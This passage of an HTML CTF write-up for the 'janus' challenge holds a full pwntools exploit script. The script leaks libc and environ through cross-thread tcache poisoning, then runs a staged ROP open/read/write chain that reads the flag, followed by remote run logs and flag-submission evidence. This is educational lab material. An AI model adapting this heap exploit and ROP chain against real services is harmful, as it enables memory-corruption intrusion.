+    <span class="n">stage1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RBP</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="n">PIVOT2</span><span class="p">)</span>
+    <span class="n">stage1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RDX_LEAVE</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+
+    <span class="c1"># stage 2: read(3, BUF, 0x100); set rdx again and pivot to stage 3</span>
+    <span class="n">stage2</span>  <span class="o">=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">stage2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">stage2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="n">BUF</span><span class="p">)</span>
+    <span class="n">stage2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">READ_OFF</span><span class="p">)</span>
+    <span class="n">stage2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RBP</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="n">PIVOT3</span><span class="p">)</span>
+    <span class="n">stage2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RDX_LEAVE</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+
+    <span class="c1"># stage 3: write(1, BUF, 0x100); exit(0)</span>
+    <span class="n">stage3</span>  <span class="o">=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">stage3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">stage3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="n">BUF</span><span class="p">)</span>
+    <span class="n">stage3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">WRITE_OFF</span><span class="p">)</span>
+    <span class="n">stage3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">stage3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">EXIT_OFF</span><span class="p">)</span>
+
+    <span class="n">region</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mh">0x190</span><span class="p">)</span>              <span class="c1"># S .. S+0x190</span>
+    <span class="n">region</span><span class="p">[</span><span class="mh">0x00</span><span class="p">:</span><span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="n">chain</span>
+    <span class="n">region</span><span class="p">[</span><span class="mh">0x40</span><span class="p">:</span><span class="mh">0x40</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">stage1</span><span class="p">)]</span> <span class="o">=</span> <span class="n">stage1</span>
+    <span class="n">region</span><span class="p">[</span><span class="mh">0xa0</span><span class="p">:</span><span class="mh">0xa0</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">stage2</span><span class="p">)]</span> <span class="o">=</span> <span class="n">stage2</span>
+    <span class="n">region</span><span class="p">[</span><span class="mh">0x100</span><span class="p">:</span><span class="mh">0x100</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">stage3</span><span class="p">)]</span> <span class="o">=</span> <span class="n">stage3</span>
+    <span class="n">region</span><span class="p">[</span><span class="mh">0x180</span><span class="p">:</span><span class="mh">0x180</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">region</span><span class="p">),</span> <span class="n">BUF</span><span class="p">,</span> <span class="n">PATH</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">environ_delta</span><span class="p">):</span>
+    <span class="n">j</span> <span class="o">=</span> <span class="n">Janus</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">leak_libc</span><span class="p">()</span>
+    <span class="n">libcbase</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">MAIN_ARENA_LEAK_OFF</span>
+    <span class="k">if</span> <span class="n">libcbase</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;bad libc base </span><span class="si">%#x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libcbase</span><span class="p">)</span>
+
+    <span class="c1"># --- read environ (choose T so tcache_get&#39;s key=0 write misses environ) ---</span>
+    <span class="n">env_addr</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">ENVIRON_OFF</span>
+    <span class="n">T</span> <span class="o">=</span> <span class="p">(</span><span class="n">env_addr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xf</span>
+    <span class="n">t_env</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">arbitrary_ptr</span><span class="p">(</span><span class="n">T</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+    <span class="n">E</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">j</span><span class="o">.</span><span class="n">peek</span><span class="p">(</span><span class="n">t_env</span><span class="p">,</span> <span class="n">env_addr</span> <span class="o">-</span> <span class="n">T</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="mh">0x7f0000000000</span> <span class="o">&lt;=</span> <span class="n">E</span> <span class="o">&lt;=</span> <span class="mh">0x7fffffffffff</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;environ looks wrong: </span><span class="si">%#x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">E</span><span class="p">)</span>
+
+    <span class="n">S</span> <span class="o">=</span> <span class="n">E</span> <span class="o">-</span> <span class="n">environ_delta</span>
+    <span class="n">T2</span> <span class="o">=</span> <span class="p">(</span><span class="n">S</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xf</span>
+    <span class="n">t_stk</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">arbitrary_ptr</span><span class="p">(</span><span class="n">T2</span><span class="p">,</span> <span class="mh">0x3f0</span><span class="p">)</span>
+
+    <span class="n">region</span><span class="p">,</span> <span class="n">BUF</span><span class="p">,</span> <span class="n">PATH</span> <span class="o">=</span> <span class="n">build_chain</span><span class="p">(</span><span class="n">libcbase</span><span class="p">,</span> <span class="n">S</span><span class="p">)</span>
+    <span class="n">off</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">off</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">region</span><span class="p">):</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">region</span><span class="p">[</span><span class="n">off</span><span class="p">:</span><span class="n">off</span><span class="o">+</span><span class="mh">0x100</span><span class="p">]</span>
+        <span class="n">j</span><span class="o">.</span><span class="n">mark</span><span class="p">(</span><span class="n">t_stk</span><span class="p">,</span> <span class="p">(</span><span class="n">S</span> <span class="o">-</span> <span class="n">T2</span><span class="p">)</span> <span class="o">+</span> <span class="n">off</span><span class="p">,</span> <span class="n">chunk</span><span class="p">)</span>
+        <span class="n">off</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+    <span class="k">return</span> <span class="n">out</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="ow">or</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;local&#39;</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">BIN</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">exploit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x180</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;serve&#39;</span><span class="p">:</span>
+        <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="mi">1337</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">exploit</span><span class="p">(</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="mh">0x188</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;remote&#39;</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">exploit</span><span class="p">(</span><span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])),</span> <span class="mh">0x188</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;usage: solve.py [local|serve|remote HOST PORT]&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="cross-thread-tcache-poisoning-in-detail">Cross-thread tcache poisoning in detail<a class="headerlink" href="#cross-thread-tcache-poisoning-in-detail" title="Permanent link">&para;</a></h3>
+<ol>
+<li><code>prep_pair(size)</code>:</li>
+<li><code>new 0</code> allocates <code>X</code>, <code>reflect</code> mirrors it to side 1.</li>
+<li><code>drop</code> both halves → <code>X</code> is freed once through each worker thread.</li>
+<li><code>new 0</code> and <code>new 1</code> allocate <code>X</code> twice; the first allocation leaks
+     <code>X &gt;&gt; 12</code> from the safe-linked <code>next</code> field.</li>
+<li>Prepare <code>P</code> and <code>Q</code> (two different chunks), drop their side-0 halves so
+   tcache0 contains <code>Q -&gt; P</code>.</li>
+<li>Write <code>target ^ (Q &gt;&gt; 12)</code> to <code>Q</code> through the still-live side-1 entry.</li>
+<li>Two <code>new 0</code> calls pop <code>Q</code> and then return the target. The second call writes
+   <code>key = 0</code> at <code>target + 8</code>, so the target must be writable; this is why
+   <code>environ</code> is read via <code>environ - 0x18</code>.</li>
+</ol>
+<p>The initial <code>new 0 0x500</code> chunk is larger than the tcache limit (<code>0x410</code>), so
+freeing it goes to the unsorted bin and leaks <code>libc + 0x204b20</code>.</p>
+<h2 id="evidence">Evidence<a class="headerlink" href="#evidence" title="Permanent link">&para;</a></h2>
+<p>Running the exploit against the remote service (reproduced twice):</p>
+<div class="highlight"><pre><span></span><code>$ python3 solve.py remote 104.105.149.249 18473
+b&#39;Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}\n
+   \x00\x00\x00\x00\x00\x00\x00\x01... (stack bytes from the 0x100-byte read)&#39;
+</code></pre></div>
+<p>Clean flag extraction:</p>
+<div class="highlight"><pre><span></span><code>$ python3 - &lt;&lt;&#39;EOF&#39;
+import sys,re
+sys.path.insert(0,&#39;.&#39;)
+import solve
+from pwn import remote
+io=remote(&#39;104.105.149.249&#39;,18473)
+out=solve.exploit(io,0x188)
+print(re.search(rb&#39;Layer7\{[0-9a-f]+\}&#39;,out).group(0).decode())
+EOF
+Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}
+</code></pre></div>
+<p>Submission:</p>
+<div class="highlight"><pre><span></span><code>$ python3 l7.py submit 6 &#39;Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}&#39;
+200 {
+  &quot;correct&quot;: true,
+  &quot;ctf_state&quot;: &quot;active&quot;
+}
+</code></pre></div>
+<p><code>work/6/submit.json</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;submitted_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2026-11-21T03:08:53.669228+00:00&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;challenge_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;6&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;flag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;http_status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;response&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;correct&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;ctf_state&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;active&quot;</span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Files in <code>work/6/</code>:</p>
+<ul>
+<li><code>solve.py</code> — final exploit (libc leak → stack leak → ORW ROP).</li>
+<li><code>audit_lib.py</code> — helper used while investigating the <code>audit</code> callback
+  (reimplementation of <code>fcn.17e0</code>, <code>encode_callback</code>/<code>decode_callback</code>); kept
+  for reference, not needed by the final exploit.</li>
+<li><code>submit.json</code> — proof of the accepted submission.</li>
+<li><code>for_user.zip</code>, <code>janus</code>, <code>Dockerfile</code>, <code>README.md</code>, <code>flag</code> — challenge files.</li>
+</ul>
+<p>Reference libc used for offset verification:</p>
+<div class="highlight"><pre><span></span><code>libc6_2.39-0ubuntu8.9_amd64.deb
+sha256 ff5557d99b51f761c4b7c92368b9cc45565eda17df9bf9eb4b134d09825008be
+libc.so.6
+sha256 3a15d66867d83762c7f2f1e37359cb8f6c5743edb369c65285cb0b1c4f7498bf
+</code></pre></div>
+<p>Remote offset verification (arbitrary read of the remote libc mapping):</p>
+<div class="highlight"><pre><span></span><code>puts        0x087cc0 MATCH
+open        0x11b3f0 MATCH
+read        0x11bd20 MATCH
+write       0x11c830 MATCH
+exit        0x047ba0 MATCH
+pop_rdi_A   0x10c08d MATCH
+pop_rdi_B   0x10f88b MATCH
+pop_rsi     0x110b7d MATCH
+pop_rdx_leave 0x09828d MATCH
+pop_rbp     0x028a91 MATCH
+</code></pre></div>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}
+</code></pre></div>
+<h2 id="evidence_1">Evidence<a class="headerlink" href="#evidence_1" title="Permanent link">&para;</a></h2>
+<h3 id="platform-submission">Platform submission<a class="headerlink" href="#platform-submission" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;submitted_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2026-11-21T03:08:53.669228+00:00&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;challenge_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;6&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;flag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;http_status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;response&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;correct&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;ctf_state&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;active&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><img alt="Platform submission" src="../../assets/6-janus/00-platform-submission.png" /></p>
+<h3 id="captured-solver-transcript">Captured solver transcript<a class="headerlink" href="#captured-solver-transcript" title="Permanent link">&para;</a></h3>
+<p>Full raw log: <a href="../../evidence/6-janus-transcript.txt"><code>evidence/6-janus-transcript.txt</code></a></p>
+<p><img alt="Solver transcript" src="../../assets/6-janus/01-solver-transcript.png" /></p>
+<h2 id="flag_1">Flag<a class="headerlink" href="#flag_1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}
+</code></pre></div>
+<blockquote>
+<p>Submitted and accepted on the platform at <code>2026-11-21 10:08:53+07:00</code> (Asia/Jakarta).</p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Layer7 CTF 2026 · write-ups by B0TCIL
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "navigation.top", "navigation.tracking", "navigation.path", "navigation.indexes", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+        <script src="../../javascripts/nx.js"></script>
+      
+    
+  </body>
+</html>
